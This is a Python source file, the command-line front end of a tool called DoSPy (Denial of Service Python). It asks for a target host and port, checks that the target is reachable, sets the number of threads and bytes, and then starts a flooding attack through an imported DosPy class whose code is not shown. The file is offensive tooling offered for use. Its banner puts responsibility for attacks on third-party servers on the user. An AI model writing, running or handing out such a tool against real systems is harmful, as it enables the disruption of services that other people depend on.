import os
import sys

from .dospy import DosPy
from .animate import Loader


def main():
    os.system('clear')

    print('\033[1;32mDoSPy (Denial of Service Python)\033[m')
    print('\033[3;33mWARNING: It is your responsibility to use this tool against third-party servers.\033[m\n')

    host = input('dospy > Host to attack = ').strip()
    port = int(input('dospy > Host port      = ').strip())

    dospy = DosPy(host, port)

    print('\n- \033[33mChecking host availability...', end=' ')
    result = dospy.is_ready_to_connect()

    if result:
        response_time = dospy.check_connection_ms()
        print('\033[32mOK\033[m')
        print(f'- \033[33mResponse time is {response_time:.4f}ms\033[m\n')
    else:
        print('\033[31m- ERROR: Could not connect to specified host and port.\033[m')
        sys.exit(1)

    threads_num = input('dospy > Number of threads (default is 100) = ').strip()
    bytes_num = input('dospy > Number of bytes (default is 1000)  = ').strip()

    if not threads_num:
        threads_num =  100
    
    if not bytes_num:
        bytes_num = 1000

    dospy.set_config(int(threads_num), int(bytes_num))

    print(f'\n- \033[33mConfigured to create {threads_num} threads, sending {bytes_num} bytes.\033[m\n')
    result = input('dospy > start attack? [y/n] = ').strip().lower()

    if result in ('y', 's'):
        try:
            print('\n\033[32m- Starting attack...', end=' ')
            dospy.attack()
            print('OK!\033[m')
            print('\033[32m- DoSPy is running...\033[m')
        except KeyboardInterrupt:
            print('\033[1;31mFAILED\033[m')
            print('\033[31m- Attack canceled by user\033[m')
            dospy.stop_attack()
    else:
        print('\n\033[31mCanceled by user!\033[m')
        sys.exit(0)
